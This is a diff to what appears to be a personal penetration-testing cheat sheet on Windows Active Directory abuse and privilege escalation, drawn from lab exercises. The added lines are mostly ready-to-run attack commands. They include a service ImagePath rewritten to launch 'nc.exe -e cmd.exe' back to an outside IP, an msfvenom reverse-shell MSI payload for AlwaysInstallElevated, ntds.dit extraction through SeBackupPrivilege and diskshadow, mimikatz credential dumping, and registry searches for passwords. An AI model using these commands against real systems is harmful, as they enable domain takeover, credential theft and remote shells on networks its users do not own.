@@ -1,8 +1,8 @@
 # Windows
-### Active Directory
-- ACL`s
+### Active Directory ACL`s with Powerview
+
 ```
-#PowerView
+
 PS C:\htb> Import-Module .\PowerView.ps1
 PS>Find-InterestingDomainAcl
 
@@ -64,7 +64,7 @@ THEN REMOVE IT
 PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
 ```
 ```
---Assigneing an SPN to a user (GenericWrite)
+--Assigning an SPN to a user (GenericWrite)
 
  PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
 
@@ -199,6 +199,12 @@ Get-DomainTrustMapping 	Will enumerate all trusts for the current domain and any
 PS C:\htb> .\ADRecon.ps1
 ```
 
+### Establish a null session from windows
+
+```
+C:\htb> net use \\DC01\ipc$ "" /u:""
+```
+
 ### Powershell Useful
 ```
             #### Builtin AD ENUM
@@ -283,6 +289,11 @@ PS C:\htb> qwinsta
 C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
 
+```
+-Enable colorfull output in powershell and cmd
+
+REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+```
 ### Checking Defenses
 
 ```
@@ -729,7 +740,9 @@ C:\htb> sc query windefend
 for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
 
 - Powershell
-1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
+
+1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"} |Select-String ttl
+
 ```
 ### System Enum
 
@@ -790,7 +803,11 @@ PS C:\htb> cmd /c echo %PATH%
 
 PS C:\htb> .\SharpUp.exe audit
 
--Checking Permissions with icacls
+--Permissice access to services
+
+PS C:\tools> accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+
+-Checking ACL's  in file system with icacls
 
 PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
 
@@ -815,6 +832,38 @@ PS C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location
 PS C:\htb> get-service | ? {$_.DisplayName -like 'Druva*'}
 
 ```
+
+###  Unquoted Service Paths
+
+```
+PS C:\> wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
+
+PS C:\> wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
+```
+### Permissive Registry ACLs
+
+```
+C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
+
+--Changing ImagePath with PowerShell
+
+C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\{ServiceName} -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
+
+- OR in cmd.exe
+
+C:\tools> reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
+
+
+```
+
+
+### Modifiable Registry Autorun Binary
+
+```
+PS C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
+
+```
+
 ### SeImpersonate and SeAssignPrimaryToken
 ```
 $ mssqlclient.py sql_dev@10.129.43.30 -windows-auth
@@ -848,6 +897,41 @@ mimikatz # sekurlsa::minidump lsass.dmp
 
 mimikatz # sekurlsa::logonpasswords
 ```
+
+### SeBackupPrivilege
+
+```
+- You can login to DC and get ntds.dit
+
+PS C:\htb> Set-SeBackupPrivilege
+
+PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
+PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
+
+PS C:\htb> diskshadow.exe
+
+DISKSHADOW> set verbose on
+DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
+DISKSHADOW> set context clientaccessible
+DISKSHADOW> set context persistent
+DISKSHADOW> begin backup
+DISKSHADOW> add volume C: alias cdrive
+DISKSHADOW> create
+DISKSHADOW> expose %cdrive% E:
+DISKSHADOW> end backup
+DISKSHADOW> exit
+
+
+PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
+
+```
+### From Administrator to SYSTEM
+
+```
+C:\htb> psexec -i -s cmd.exe
+
+```
+
 
 ### UAC
 
@@ -924,6 +1008,26 @@ PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%
 - AlwaysInstallElevated 
 
 C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+
+-- Generating msi payload
+
+$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
+
+
+- Executing in cmd.exe
+
+C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
+```
+
+```
+--Finding credentials in registry
+
+REG QUERY HKLM /F "password" /t REG_SZ /S /K
+REG QUERY HKCU /F "password" /t REG_SZ /S /K
+REG QUERY HKLM /F "password" /t REG_SZ /S /d
+REG QUERY HKCU /F "password" /t REG_SZ /S /d
+
 ```
 
 # Linux 
